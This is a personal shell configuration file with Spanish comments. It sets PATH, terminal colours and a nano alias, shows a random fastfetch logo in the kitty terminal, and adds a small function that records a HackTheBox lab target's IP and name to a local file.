export PATH=~/.npm-global/bin:$PATH

export LS_COLORS='di=1;38;5;39:ln=38;5;81:so=38;5;183:pi=38;5;226:ex=38;5;118:bd=38;5;208:cd=38;5;208:su=38;5;196:sg=38;5;196:tw=38;5;141:ow=38;5;141'
alias nanoc='nano --syntax=none'

# Fastfetch Cyberpunk Display (Nuclear Kitty & Pywal Sync)
# Verificación de secuencias de pywal (Desactivado para estabilidad de colores Pro)
# [ -f ~/.cache/wal/sequences ] && (/usr/bin/cat ~/.cache/wal/sequences &) 
export DE=gnome
FF_LOGOS=($HOME/.config/fastfetch/logos/*.png)
RANDOM_LOGO=$(printf "%s\n" "${FF_LOGOS[@]}" | shuf -n 1)
FF_COLOR=$($HOME/.config/fastfetch/get_color.sh)

# Detección Robusta de Kitty (Variables nativas + TERM)
if [ -z "$SSH_CONNECTION" ] && { [ -n "$KITTY_PID" ] || [ -n "$KITTY_WINDOW_ID" ] || [[ "$TERM" == *"kitty"* ]]; }; then
    # Usar fastfetch directamente para mostrar la imagen en kitty con --logo-width
    if [ -f "$RANDOM_LOGO" ]; then
        fastfetch --logo "$RANDOM_LOGO" --logo-type kitty --logo-width 30 --color-keys "$FF_COLOR" --color-title "$FF_COLOR"
    else
        fastfetch --color-keys "$FF_COLOR" --color-title "$FF_COLOR"
    fi
else
    fastfetch --color-keys "$FF_COLOR" --color-title "$FF_COLOR"
fi


# ========================================
# BLACK-ICE: Función settarget para HTB (s4vitar style)
# ========================================
function settarget(){
	ip_address=$1
	machine_name=$2
	echo "$ip_address $machine_name" > $HOME/.config/bin/target
}
